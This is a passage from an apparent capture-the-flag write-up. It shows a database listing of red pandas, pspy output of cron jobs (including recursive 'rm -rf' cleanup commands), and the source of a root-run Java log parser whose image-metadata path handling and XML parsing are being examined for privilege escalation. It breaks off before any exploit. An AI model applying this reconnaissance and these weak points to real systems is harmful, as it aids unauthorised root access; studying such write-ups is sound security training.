<span class="o">|</span><span class="w"> </span><span class="n">Hungy</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Hungy</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="n">hungry</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">he</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">eating</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">bamboo</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">world</span><span class="o">!</span><span class="w">                </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">hungy</span><span class="p">.</span><span class="n">jpg</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">woodenk</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Greg</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">Greg</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">hacker</span><span class="p">.</span><span class="w"> </span><span class="n">Watch</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">attacks</span><span class="o">!</span><span class="w">                             </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">greg</span><span class="p">.</span><span class="n">jpg</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">woodenk</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Mr</span><span class="w"> </span><span class="n">Puffy</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Mr</span><span class="w"> </span><span class="n">Puffy</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">fluffiest</span><span class="w"> </span><span class="n">red</span><span class="w"> </span><span class="n">panda</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">ever</span><span class="w"> </span><span class="n">lived</span><span class="p">.</span><span class="w">                            </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">mr_puffy</span><span class="p">.</span><span class="n">jpg</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">damian</span><span class="w">  </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Florida</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Florida</span><span class="w"> </span><span class="n">panda</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">evil</span><span class="w"> </span><span class="n">twin</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">Greg</span><span class="p">.</span><span class="w"> </span><span class="n">Watch</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">him</span><span class="o">!</span><span class="w">                         </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">florida</span><span class="p">.</span><span class="n">jpg</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">woodenk</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Lazy</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">Lazy</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="n">very</span><span class="w"> </span><span class="n">sleepy</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">he</span><span class="w"> </span><span class="n">likes</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">lay</span><span class="w"> </span><span class="n">around</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">day</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="k">nothing</span><span class="p">.</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">lazy</span><span class="p">.</span><span class="n">jpg</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">woodenk</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Shy</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">Shy</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="n">suggest</span><span class="w"> </span><span class="n">very</span><span class="w"> </span><span class="n">shy</span><span class="p">.</span><span class="w"> </span><span class="n">But</span><span class="w"> </span><span class="n">he</span><span class="w"> </span><span class="n">likes</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">cuddle</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">he</span><span class="w"> </span><span class="n">feels</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">shy</span><span class="p">.</span><span class="n">jpg</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">damian</span><span class="w">  </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Smiley</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Smiley</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="n">very</span><span class="w"> </span><span class="n">happy</span><span class="p">.</span><span class="w"> </span><span class="n">She</span><span class="w"> </span><span class="n">loves</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">look</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">beautiful</span><span class="w"> </span><span class="n">people</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="o">!</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">smiley</span><span class="p">.</span><span class="n">jpg</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">woodenk</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Angy</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">Angy</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="n">very</span><span class="w"> </span><span class="n">grumpy</span><span class="p">.</span><span class="w"> </span><span class="n">He</span><span class="w"> </span><span class="n">sticks</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">tongue</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">everyone</span><span class="p">.</span><span class="w">                  </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">angy</span><span class="p">.</span><span class="n">jpg</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">damian</span><span class="w">  </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Peter</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Peter</span><span class="w"> </span><span class="n">loves</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">climb</span><span class="p">.</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">think</span><span class="w"> </span><span class="n">he</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">spider</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">previous</span><span class="w"> </span><span class="n">life</span><span class="p">.</span><span class="w">               </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">peter</span><span class="p">.</span><span class="n">jpg</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">damian</span><span class="w">  </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">Crafty</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Crafty</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="n">busy</span><span class="w"> </span><span class="n">creating</span><span class="w"> </span><span class="n">art</span><span class="p">.</span><span class="w"> </span><span class="n">They</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">become</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">very</span><span class="w"> </span><span class="n">famous</span><span class="w"> </span><span class="n">red</span><span class="w"> </span><span class="n">panda</span><span class="o">!</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">crafty</span><span class="p">.</span><span class="n">jpg</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">damian</span><span class="w">  </span><span class="o">|</span>
<span class="o">+</span><span class="c1">----------+------------------------------------------------------------------------------------+------------------+---------+</span>
<span class="mi">11</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>
</pre></div>
</div>
<p>It’s not really helping though</p>
</section>
<section id="privesc">
<h2>Privesc<a class="headerlink" href="#privesc" title="Permalink to this heading">#</a></h2>
<p>Observing what’s going on with pspy64, we can see that there’s a few cronjobs there’s one run by woodenk</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:50:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">76678</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>/opt/cleanup.sh
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:50:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">76679</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>/opt/cleanup.sh
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:50:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">76682</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/bin/find<span class="w"> </span>/var/tmp<span class="w"> </span>-name<span class="w"> </span>*.xml<span class="w"> </span>-exec<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="p">;</span>
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:50:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">76683</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/bin/find<span class="w"> </span>/dev/shm<span class="w"> </span>-name<span class="w"> </span>*.xml<span class="w"> </span>-exec<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="p">;</span>
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:50:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">76684</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/bin/find<span class="w"> </span>/home/woodenk<span class="w"> </span>-name<span class="w"> </span>*.xml<span class="w"> </span>-exec<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="p">;</span>
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:50:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">76697</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/bin/find<span class="w"> </span>/home/woodenk<span class="w"> </span>-name<span class="w"> </span>*.jpg<span class="w"> </span>-exec<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="p">;</span>
</pre></div>
</div>
<p>this does not seem too interesting as this is woodenk and the paths are absolute, so probably no path highjacking there.</p>
<p>But there’s another one run by root that triggers a java app:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:48:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">76646</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/usr/sbin/CRON<span class="w"> </span>-f
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:48:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">76648</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>/root/run_credits.sh
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:48:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">76647</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span>/root/run_credits.sh
<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">13</span>:48:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">76649</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>java<span class="w"> </span>-jar<span class="w"> </span>/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
</pre></div>
</div>
<p>Looking at the source</p>
<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedWriter</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileWriter</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Scanner</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">com.drew.imaging.jpeg.JpegMetadataReader</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.drew.imaging.jpeg.JpegProcessingException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.drew.metadata.Directory</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.drew.metadata.Metadata</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.drew.metadata.Tag</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.JDOMException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.input.SAXBuilder</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.output.Format</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.output.XMLOutputter</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.*</span><span class="p">;</span>

<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">App</span><span class="w"> </span><span class="p">{</span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="nf">parseLog</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">strings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">line</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;\\|\\|&quot;</span><span class="p">);</span>
<span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
<span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;status_code&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">));</span>
<span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;ip&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">);</span>
<span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;user_agent&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span><span class="p">);</span>
<span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span><span class="p">);</span>


<span class="k">return</span><span class="w"> </span><span class="n">map</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isImage</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">){</span>
<span class="k">if</span><span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;.jpg&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getArtist</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">JpegProcessingException</span>
<span class="p">{</span>
<span class="n">String</span><span class="w"> </span><span class="n">fullpath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/opt/panda_search/src/main/resources/static&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">uri</span><span class="p">;</span>
<span class="n">File</span><span class="w"> </span><span class="n">jpgFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">fullpath</span><span class="p">);</span>
<span class="n">Metadata</span><span class="w"> </span><span class="n">metadata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JpegMetadataReader</span><span class="p">.</span><span class="na">readMetadata</span><span class="p">(</span><span class="n">jpgFile</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="n">Directory</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">metadata</span><span class="p">.</span><span class="na">getDirectories</span><span class="p">())</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="n">Tag</span><span class="w"> </span><span class="n">tag</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">dir</span><span class="p">.</span><span class="na">getTags</span><span class="p">())</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">	</span><span class="k">if</span><span class="p">(</span><span class="n">tag</span><span class="p">.</span><span class="na">getTagName</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;Artist&quot;</span><span class="p">)</span>
<span class="w">	</span><span class="p">{</span>
<span class="w">	    </span><span class="k">return</span><span class="w"> </span><span class="n">tag</span><span class="p">.</span><span class="na">getDescription</span><span class="p">();</span>
<span class="w">	</span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">return</span><span class="w"> </span><span class="s">&quot;N/A&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addViewTo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">JDOMException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span>
<span class="p">{</span>
<span class="n">SAXBuilder</span><span class="w"> </span><span class="n">saxBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXBuilder</span><span class="p">();</span>
<span class="n">XMLOutputter</span><span class="w"> </span><span class="n">xmlOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLOutputter</span><span class="p">();</span>
<span class="n">xmlOutput</span><span class="p">.</span><span class="na">setFormat</span><span class="p">(</span><span class="n">Format</span><span class="p">.</span><span class="na">getPrettyFormat</span><span class="p">());</span>

<span class="n">File</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>

<span class="n">Document</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">saxBuilder</span><span class="p">.</span><span class="na">build</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

<span class="n">Element</span><span class="w"> </span><span class="n">rootElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">doc</span><span class="p">.</span><span class="na">getRootElement</span><span class="p">();</span>

<span class="k">for</span><span class="p">(</span><span class="n">Element</span><span class="w"> </span><span class="n">el</span><span class="p">:</span><span class="w"> </span><span class="n">rootElement</span><span class="p">.</span><span class="na">getChildren</span><span class="p">())</span>
<span class="p">{</span>


<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">el</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;image&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">	</span><span class="k">if</span><span class="p">(</span><span class="n">el</span><span class="p">.</span><span class="na">getChild</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">).</span><span class="na">getText</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">uri</span><span class="p">))</span>
<span class="w">	</span><span class="p">{</span>
<span class="w">	    </span><span class="n">Integer</span><span class="w"> </span><span class="n">totalviews</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">rootElement</span><span class="p">.</span><span class="na">getChild</span><span class="p">(</span><span class="s">&quot;totalviews&quot;</span><span class="p">).</span><span class="na">getText</span><span class="p">())</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">	    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Total views:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">totalviews</span><span class="p">));</span>
<span class="w">	    </span><span class="n">rootElement</span><span class="p">.</span><span class="na">getChild</span><span class="p">(</span><span class="s">&quot;totalviews&quot;</span><span class="p">).</span><span class="na">setText</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">totalviews</span><span class="p">));</span>
<span class="w">	    </span><span class="n">Integer</span><span class="w"> </span><span class="n">views</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">el</span><span class="p">.</span><span class="na">getChild</span><span class="p">(</span><span class="s">&quot;views&quot;</span><span class="p">).</span><span class="na">getText</span><span class="p">());</span>
<span class="w">	    </span><span class="n">el</span><span class="p">.</span><span class="na">getChild</span><span class="p">(</span><span class="s">&quot;views&quot;</span><span class="p">).</span><span class="na">setText</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">views</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">));</span>
<span class="w">	</span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="n">BufferedWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedWriter</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileWriter</span><span class="p">(</span><span class="n">fd</span><span class="p">));</span>
<span class="n">xmlOutput</span><span class="p">.</span><span class="na">output</span><span class="p">(</span><span class="n">doc</span><span class="p">,</span><span class="w"> </span><span class="n">writer</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">JDOMException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">JpegProcessingException</span><span class="w"> </span><span class="p">{</span>
<span class="n">File</span><span class="w"> </span><span class="n">log_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&quot;/opt/panda_search/redpanda.log&quot;</span><span class="p">);</span>
<span class="n">Scanner</span><span class="w"> </span><span class="n">log_reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">log_fd</span><span class="p">);</span>
<span class="k">while</span><span class="p">(</span><span class="n">log_reader</span><span class="p">.</span><span class="na">hasNextLine</span><span class="p">())</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">log_reader</span><span class="p">.</span><span class="na">nextLine</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">isImage</span><span class="p">(</span><span class="n">line</span><span class="p">))</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">	</span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">Map</span><span class="w"> </span><span class="n">parsed_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseLog</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">parsed_data</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">));</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">artist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getArtist</span><span class="p">(</span><span class="n">parsed_data</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">).</span><span class="na">toString</span><span class="p">());</span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Artist: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">artist</span><span class="p">);</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">xmlPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/credits/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">artist</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;_creds.xml&quot;</span><span class="p">;</span>
